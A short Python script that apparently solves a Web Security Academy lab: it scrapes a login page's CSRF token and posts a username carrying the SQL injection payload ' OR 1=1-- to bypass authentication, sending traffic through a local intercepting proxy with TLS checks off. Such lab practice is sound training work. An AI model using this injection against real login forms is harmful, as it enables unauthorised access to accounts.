from typing import Union
from urllib.parse import quote

import requests as r
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = r.Session()

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_csrf_token(url: str) -> Union[None, str]:
    response: r.Response = session.get(url, verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]


def main() -> None:
    URL = "https://0a3500eb04a9e78581c570660080003f.web-security-academy.net/login"

    token = get_csrf_token(URL)

    PAYLOAD = "' OR 1=1--"
    response = session.post(
        URL,
        data=f"csrf={token}&username=admin{PAYLOAD}&password=admin",
        verify=False,
    )

    print(response.text)
    print(response.status_code)
    print(response)
    print(f"csrf={token}&username=admin{quote(PAYLOAD)}&password=admin")


if __name__ == "__main__":
    main()
